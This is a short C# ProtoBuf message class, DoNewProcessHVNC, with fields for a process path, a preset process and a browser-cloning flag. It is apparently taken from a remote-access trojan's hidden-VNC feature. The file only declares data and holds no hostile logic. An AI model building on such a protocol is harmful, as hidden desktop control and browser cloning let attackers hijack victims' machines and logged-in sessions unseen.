

using ProtoBuf;


namespace InvokedCommon.Messages
{
	[ProtoContract]
	public class DoNewProcessHVNC : IMessage
	{
		[ProtoMember(1)]
		public string ProcessPath { get; set; }

		[ProtoMember(2)]
		public string PresetProcess { get; set; }

		[ProtoMember(3)]
		public bool CloneBrowser { get; set; }
	}
}
